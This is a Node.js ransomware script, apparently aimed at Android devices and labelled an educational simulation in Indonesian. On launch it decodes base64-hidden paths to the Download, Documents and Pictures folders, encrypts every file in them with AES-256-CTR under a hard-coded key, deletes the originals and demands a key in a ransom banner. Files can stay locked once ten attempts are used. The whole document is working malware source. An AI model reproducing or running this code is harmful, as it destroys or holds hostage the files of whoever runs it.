const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const readline = require("readline");

const decode = (b64) => Buffer.from(b64, "base64").toString();

const ガンツ = {
  key: Buffer.from("MzIxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "base64"),
  targetDirs: [
    "L3NkY2FyZC9Eb3dubG9hZC8=",
    "L3NkY2FyZC9Eb2N1bWVudHMv",
    "L3NkY2FyZC9QaWN0dXJlcy8="
  ].map(decode),
  banner: decode(
    "IF9fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAKfCAgXyBcIF9fIF8gX19fIF8gX19fICBfIF9fX3wgfCAgX18gIF8gX19fICAgX18gICAKfCAvXykgfCBfXy8gX2AgfCAvXyBcfCB8LyBfYCB8IC8gXyBcIC8gX2AgfCAvIF8gXCAKfCAgXyA8IChffCB8ICB8IChfKSB8IHwgKF8pIHwgfCAgXyAgPCAgIF8vICAKfF8vIFxfX19fX3xffCAgXF9fXy98X3xcX18vfF98XF9fLCB8X3xcX198IHxcX198X3w="
  )
};

class SecureRansomware {
  constructor() {
    this.key = ガンツ.key;
    this.cipherAlgorithm = 'aes-256-ctr';
    this.targetDirs = ガンツ.targetDirs;
    this.encryptedFiles = [];
    this.attempts = 0;
    this.maxAttempts = 10;
  }

  showBanner() {
    console.clear();
    console.log(ガンツ.banner);
    console.log("!!! PERINGATAN ‼️ FILE DIENKRIPSI ‼️");
    console.log("Masukkan key untuk memulihkan file kamu...");
    console.log(`Percobaan tersisa: ${this.maxAttempts - this.attempts}`);
  }

  findFiles() {
    const results = [];
    for (const dir of this.targetDirs) {
      if (fs.existsSync(dir)) {
        this.scanDir(dir, results);
      }
    }
    return results;
  }

  scanDir(dir, results) {
    try {
      const files = fs.readdirSync(dir);
      for (const file of files) {
        const fullPath = path.join(dir, file);
        const stat = fs.statSync(fullPath);
        if (stat.isDirectory()) {
          this.scanDir(fullPath, results);
        } else {
          if (!file.endsWith(".encrypted")) {
            results.push(fullPath);
          }
        }
      }
    } catch (_) {}
  }

  encryptFile(file) {
    return new Promise((resolve) => {
      try {
        const data = fs.readFileSync(file);
        const cipher = crypto.createCipheriv(this.cipherAlgorithm, this.key, Buffer.alloc(16, 0));
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        fs.writeFileSync(file + ".encrypted", encrypted);
        fs.unlinkSync(file);
        this.encryptedFiles.push(file + ".encrypted");
      } catch (_) {}
      resolve();
    });
  }

  decryptFile(file) {
    return new Promise((resolve) => {
      try {
        const data = fs.readFileSync(file);
        const decipher = crypto.createDecipheriv(this.cipherAlgorithm, this.key, Buffer.alloc(16, 0));
        const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
        const original = file.replace(".encrypted", "");
        fs.writeFileSync(original, decrypted);
        fs.unlinkSync(file);
      } catch (_) {}
      resolve();
    });
  }

  async encryptFiles() {
    const files = this.findFiles();
    for (const file of files) {
      await this.encryptFile(file);
    }
  }

  async decryptFiles() {
    for (const file of this.encryptedFiles) {
      await this.decryptFile(file);
    }
  }

  async run() {
    await this.encryptFiles();
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    const prompt = () => {
      this.showBanner();
      rl.question("Masukkan KEY: ", async (input) => {
        if (input === "321") {
          rl.close();
          await this.decryptFiles();
          console.log("\n[✓] File berhasil dipulihkan 🎉");
          process.exit(0);
        } else {
          this.attempts++;
          if (this.attempts >= this.maxAttempts) {
            console.log("[!] Terlalu banyak kesalahan. Keluar.");
            rl.close();
            process.exit(1);
          } else {
            setTimeout(prompt, 1000);
          }
        }
      });
    };

    prompt();
  }
}

console.clear();
console.log("🚨 Simulasi Ransomware Edukasi by GanzMods 🚨");

const malware = new SecureRansomware();
malware.run();
